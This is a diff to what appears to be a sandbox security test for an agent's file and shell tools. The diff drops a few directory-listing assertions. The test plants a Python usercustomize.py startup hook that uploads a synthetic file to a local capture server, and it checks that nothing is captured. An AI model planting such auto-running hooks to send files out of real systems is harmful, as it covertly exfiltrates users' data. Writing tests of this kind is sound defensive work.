@@ -2791,8 +2791,6 @@ server.serve_forever()`;
       await call('write', { path: `${base}/synthetic.txt`, content: data });
       const upload = `import urllib.request\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:18751/capture',data=open('${base}/synthetic.txt','rb').read(),method='POST'),timeout=3).close()\n`;
       await call('write', { path: `${userSite}/usercustomize.py`, content: upload });
-      assert.match(await call('ls', {}), /synthetic.txt/);
-      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
       assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
       assert.equal(await captured(), 0);
       await docker(
@@ -2822,8 +2820,6 @@ server.serve_forever()`;
         content: '#!/bin/sh\nprintf synthetic-installed-tool\n',
       });
       assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
-      assert.match(await call('ls', {}), /synthetic.txt/);
-      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
       assert.equal(await captured(), 0);
       assert.equal(
         (await call('bash', { command: `cat '${base}/synthetic.txt' | /usr/bin/cat` })).trim(),
